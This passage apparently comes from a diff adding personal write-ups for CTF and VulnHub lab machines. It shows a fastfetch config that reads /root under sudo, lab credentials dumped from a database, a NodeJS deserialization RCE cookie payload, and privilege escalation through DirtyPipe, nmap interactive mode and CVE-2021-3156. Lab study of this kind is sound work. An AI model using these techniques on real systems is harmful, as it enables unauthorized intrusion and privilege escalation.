+            "keyColor": "green"
+        },
+        {
+            "type": "disk",
+            "key": "└ └",
+            "keyColor": "green"
+        },
+        {
+            "type": "custom",
+            "format": "\u001b[90m└────────────────────────────────────────────────────┘"
+        },
+        "break",
+        {
+            "type": "custom",
+            "format": "\u001b[90m┌──────────────────────Software──────────────────────┐"
+        },
+        {
+            "type": "os",
+            "key": " OS",
+            "keyColor": "yellow"
+        },
+        {
+            "type": "kernel",
+            "key": "│ ├",
+            "keyColor": "yellow"
+        },
+        {
+            "type": "bios",
+            "key": "│ ├",
+            "keyColor": "yellow"
+        },
+        {
+            "type": "packages",
+            "key": "│ ├󰏖",
+            "keyColor": "yellow"
+        },
+        {
+            "type": "shell",
+            "key": "└ └",
+            "keyColor": "yellow"
+        },
+        "break",
+        {
+            "type": "de",
+            "key": " DE",
+            "keyColor": "blue"
+        },
+        {
+            "type": "lm",
+            "key": "│ ├",
+            "keyColor": "blue"
+        },
+        {
+            "type": "wm",
+            "key": "│ ├",
+            "keyColor": "blue"
+        },
+        {
+            "type": "wmtheme",
+            "key": "│ ├󰉼",
+            "keyColor": "blue"
+        },
+        {
+            "type": "terminal",
+            "key": "└ └",
+            "keyColor": "blue"
+        },
+        {
+            "type": "custom",
+            "format": "\u001b[90m└────────────────────────────────────────────────────┘"
+        },
+        "break",
+        {
+            "type": "custom",
+            "format": "\u001b[90m┌────────────────────Uptime / Age / DT────────────────────┐"
+        },
+        {
+            "type": "command",
+            "key": "  OS Age ",
+            "keyColor": "magenta",
+            "text": "cat /root/r00t.txt"
+        },
+        {
+            "type": "uptime",
+            "key": "  Uptime ",
+            "keyColor": "magenta"
+        },
+        {
+            "type": "datetime",
+            "key": "  DateTime ",
+            "keyColor": "magenta"
+        },
+        {
+            "type": "custom",
+            "format": "\u001b[90m└─────────────────────────────────────────────────────────┘"
+        },
+
+//        {
+//            "type": "colors"
+//        },
+
+        {
+            "type": "colors",
+            "paddingLeft": 2,
+            "symbol": "circle"
+        }
+ 
+    ]
+}
+```
+
+This is just the config from reddit, modified with the shell command.
+
+3. Now run `sudo /usr/bin/fastfetch --config /home/qaq/fastfetch/config.jsonc`
+
+This will show you the root flag in the `OS Age:` section.
+
+That's it, enjoy pwning :)
+
+
+
+
+____________________________________________________________________________________________________
+# ica1 - A VulnHub Machine
+
+MACHINE IP: 192.168.1.17
+HOST NAME: ica1.vnb
+
+in the /conre/config/databases.yml file, passwords are exposed.
+Login Credentials:
+```
+qdpmadmin:<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>
+```
+
+Instead, using the credentials to log in to mysql gives us these tables:
+```
++------+---------+--------------------------+
+| id   | user_id | password                 |
++------+---------+--------------------------+
+|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
+|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
+|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
+|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
+|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
++------+---------+--------------------------+
+```
+```
++------+---------------+--------+---------------------------+
+| id   | department_id | name   | role                      |
++------+---------------+--------+---------------------------+
+|    1 |             1 | Smith  | Cyber Security Specialist |
+|    2 |             2 | Lucas  | Computer Engineer         |
+|    3 |             1 | Travis | Intelligence Specialist   |
+|    4 |             1 | Dexter | Cyber Security Analyst    |
+|    5 |             2 | Meyer  | Genetic Engineer          |
++------+---------------+--------+---------------------------+
+```
+
+Let's use the credentials (which look like base64) and brute force our ssh Login
+```
+user_id:pass
+2:suRJAdGwLp8dy3rF
+4:7ZwV4qtg42cmUXGX
+1:X7MQkP3W29fewHdC
+3:DJceVy98W28Y7wLg
+5:cqNnBWCByS2DuJSy
+```
+
+
+So in the end, the username Travis with the password for his id gives us ssh login
+**User flag: ICA{Secret_Project}**
+
+The system is vulnerable to the dirtypipe exploit found in [Dirtypipe Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)
+
+Running this will give an error but if you login to root with password aaron, after running the exploit, it works.
+
+This is not the intended method of privesc however, so some other time try the intended method of privesc
+
+
+
+
+____________________________________________________________________________________________________
+username: elliot
+password: ER28-0652 Found by bruteforce
+
+ssh username: robot
+ssh password: abcdefghijklmnopqrstuvwxyz Found by analyzing the system files and cracking md5 hash.
+
+File Upload vulnerability in Wp 4.3.1:
+  -> In the plugins page, select the add new option. Upload the php file and navigate to the media page. It will be reflected there.
+run linpeas.sh on the target which will highlight nmap as a potential PE vector.
+Run nmap in interactive mode
+This runs on root privileges. Use this to read the files in /root
+
+
+
+
+____________________________________________________________________________________________________
+Website: VulnHub
+
+Open ports 22,8080
+
+Port 8080:
+  Framework: Express.js
+  
+  Exploit: NodeJS Deserialization
+  
+  NodeJS shell generator: https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
+  
+  How to use the exploit:
+  `{"rce": "_$$ND_FUNC$$_function () {[Copy the eval from the shell generator]} ()"}`
+  
+  ***Use this in the session cookie after base64 encoding the whole thing***.
+  
+  Now the privesc is just **CVE-2021-3156**, from which I used **exploit_nss.py**
+  
+  Get this exploit from the *linpeas.sh* scan.
+
+Key Takeaway: NodeJS Deserialization.
+
+
+
+
+____________________________________________________________________________________________________
